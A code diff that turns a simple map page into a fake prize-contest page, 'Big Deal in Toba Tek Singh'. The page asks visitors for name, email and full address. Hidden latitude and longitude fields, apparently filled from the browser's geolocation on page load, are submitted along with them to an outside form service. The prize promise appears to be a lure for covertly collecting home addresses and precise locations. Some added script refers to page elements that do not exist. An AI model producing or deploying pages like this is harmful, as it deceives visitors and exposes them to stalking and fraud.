@@ -3,33 +3,43 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Show My Location on Map</title>
-    <style>
-      /* Set the size of the map */
-      #map {
-        height: 400px;
-        width: 100%;
-        border: 1px solid #ccc;
-        margin-top: 20px;
-      }
-    </style>
+    <title>Give Me Back</title>
   </head>
   <body>
-    <div id="location"></div>
-    <div id="map"></div>
-    <form name="contact" netlify>
-      <p>
-        <label>Name <input type="text" name="name" /></label>
-      </p>
-      <p>
-        <label>Email <input type="email" name="email" /></label>
-      </p>
-      <input type="hidden" id="latitude" placeholder="Latitude" />
-      <input type="hidden" id="longitude" placeholder="Longitude" />
-      <p>
-        <button type="submit">Send</button>
-      </p>
-    </form>
+    <div class="form-wrapper">
+      <form action="https://formspree.io/f/xdknpejk" method="POST">
+        <h1 style="text-align: center">Big Deal in Toba Tek Singh</h1>
+        <p style="text-align: center; font-size: 20px">
+          Submit form to win lucky prizes!
+        </p>
+        <p>
+          <label>Name <input type="text" name="name" /></label>
+        </p>
+        <p>
+          <label>Email <input type="email" name="email" /></label>
+        </p>
+
+        <p>
+          <label
+            >Complete Address <input type="address" name="address"
+          /></label>
+        </p>
+
+        <input
+          type="hidden"
+          name="latitude"
+          id="latitude"
+          placeholder="Latitude"
+        />
+        <input
+          type="hidden"
+          name="longitude"
+          id="longitude"
+          placeholder="Longitude"
+        />
+        <button type="submit" class="submitBtn">Send</button>
+      </form>
+    </div>
 
     <script>
       function showUserLocation() {
@@ -70,6 +80,118 @@
 
       // Call the function when the page loads
       window.onload = showUserLocation;
+
+      document
+        .getElementById("startBtn")
+        .addEventListener("click", function () {
+          const spinner = document.getElementById("spinner");
+          const formSection = document.getElementById("formSection");
+          const startBtn = this;
+
+          startBtn.disabled = true;
+          spinner.style.display = "block";
+
+          // Simulate spinning for 3 seconds
+          setTimeout(function () {
+            spinner.style.display = "none";
+            formSection.style.display = "block";
+            startBtn.disabled = false;
+          }, 3000); // Adjust the time for the spin duration
+        });
     </script>
+
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap");
+      body {
+        font-family: "Poppins", sans-serif;
+        margin: 0;
+        padding: 0;
+        height: 100vh;
+        display: flex;
+      }
+
+      @media screen and (max-width: 768px) {
+        body {
+          display: block;
+        }
+        .form-wrapper {
+          width: 100% !important;
+        }
+      }
+
+      .hero {
+        background-color: #f4f4f4;
+        padding: 50px;
+        position: relative;
+      }
+
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      button {
+        padding: 10px 20px;
+        font-size: 16px;
+        color: #fff;
+        background-color: #3498db;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+      }
+
+      button:disabled {
+        background-color: #ddd;
+      }
+
+      .form-section {
+        display: none;
+        background-color: #fff;
+        padding: 30px;
+        margin: 20px;
+        border-radius: 8px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      }
+
+      .form-group {
+        margin-bottom: 15px;
+      }
+
+      form input,
+      form select {
+        width: 96%;
+        padding: 24px 10px;
+        font-size: 16px;
+        border: 1px solid #ddd;
+        border-radius: 20px;
+      }
+      /* Set the size of the map */
+      #map {
+        height: 400px;
+        width: 100%;
+        border: 1px solid #ccc;
+        margin-top: 20px;
+      }
+      .form-wrapper {
+        width: 800px;
+        margin: auto;
+        padding: 60px 30px;
+        box-shadow: rgba(149, 157, 165, 0.2) 0px 8px 24px;
+        border-radius: 50px;
+      }
+
+      .submitBtn {
+        background-color: #3498db;
+        border: none;
+        border-radius: 20px;
+        cursor: pointer;
+        padding: 24px 10px;
+        width: 100%;
+      }
+    </style>
   </body>
 </html>
